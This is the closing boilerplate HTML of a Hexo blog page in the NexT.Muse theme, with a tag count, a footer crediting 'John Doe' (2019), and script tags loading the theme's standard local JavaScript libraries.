                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
